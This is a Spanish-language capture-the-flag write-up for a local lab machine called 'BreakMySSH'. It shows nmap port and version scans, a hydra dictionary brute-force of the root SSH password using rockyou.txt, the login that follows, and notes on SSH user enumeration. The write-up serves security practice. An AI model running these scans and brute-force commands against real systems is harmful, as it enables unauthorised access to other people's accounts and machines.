# 🛡️ Máquina: BreakMySSH  
**Dificultad:** Muy Fácil  

## 📌 Descripción  
El propósito de esta máquina es poner a prueba habilidades básicas de enumeración de servicios, fuerza bruta por SSH y posibles caminos hacia la escalada de privilegios a través del análisis del sistema.

---

## ⚙️ Despliegue de la Máquina  

Primero descargamos el archivo `.zip` de la máquina y lo descomprimimos con:

```bash
unzip breakmyssh.zip
```

Luego desplegamos la máquina con el script proporcionado:

```bash
sudo bash auto_deploy.sh breakmyssh.tar
```

![Despliegue de la máquina](/BreakMySSH/Imagenes/Despliegue.jpeg)

---

## 📡 Verificación de Conectividad  

Verificamos que la máquina esté activa mediante un `ping` a su dirección IP (172.17.0.2):

```bash
ping -c4 172.17.0.2
```

![Ping a la máquina](/BreakMySSH/Imagenes/Ping.jpeg)

---

## 🔎 Escaneo de Puertos con Nmap  

Realizamos un escaneo de todos los puertos para descubrir cuáles están abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

**Explicación de opciones:**
- `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Muestra solo los puertos abiertos.
- `-sS`: Realiza un escaneo SYN.
- `--min-rate 5000`: Aumenta la velocidad de escaneo.
- `-Pn`: Omite la detección de host.
- `-oG`: Guarda la salida en formato grepeable.

![Resultado del escaneo de puertos](/BreakMySSH/Imagenes/Puertos.jpeg)

---

## 📂 Extracción de Puertos  

Utilicé un script personalizado `extractPorts` para extraer rápidamente la IP y los puertos abiertos del archivo generado:

```bash
extractPorts allPorts.txt
```

---

## 🔍 Detección de Servicios y Versiones  

Con el puerto 22 identificado como abierto, ejecutamos un escaneo más específico para detectar versiones y posibles scripts predeterminados:

```bash
nmap -sC -sV -p 22 172.17.0.2 -oN target.txt
```

**Explicación de opciones:**
- `-sC`: Usa scripts por defecto de Nmap.
- `-sV`: Detecta versiones de servicios.
- `-p 22`: Escanea solo el puerto 22 (SSH).
- `-oN`: Guarda la salida en un archivo legible.

![Detección de versiones](/BreakMySSH/Imagenes/Servicios.jpeg)

---

## 🗝️ Ataque de Fuerza Bruta con Hydra  

Dado que solo está disponible el puerto SSH (22) usare el usuario `root` para verificar si es un usuario disponible, intentamos acceder mediante fuerza bruta con `hydra` usando el diccionario `rockyou.txt`:

```bash
sudo hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

**Hydra** es una herramienta popular para ataques de diccionario contra múltiples protocolos, incluido SSH.

![Ataque con Hydra](/BreakMySSH/Imagenes/Hydra.jpeg)

---

## 🔐 Acceso SSH Exitoso  

Una vez encontrada la contraseña del usuario `root`, accedemos mediante:

```bash
ssh root@172.17.0.2
```

![Acceso SSH](/BreakMySSH/Imagenes/SSH.jpeg)

---

## 🧠 Notas Adicionales  

- Usé la herramienta `searchsploit` para investigar la versión del servicio SSH. Encontré una vulnerabilidad relacionada con la **enumeración de usuarios**.
- En el directorio `/home` se encuentra otro usuario, lo que sugiere que podríamos explotar esta vulnerabilidad para enumerar usuarios válidos.
- Una vez identificado ese segundo usuario, sería posible realizar otro ataque de fuerza bruta con `hydra` y así acceder a la máquina bajo ese perfil.
- Este tipo de escenario es ideal para practicar escaladas de privilegios locales una vez que se tiene acceso como usuario no privilegiado.
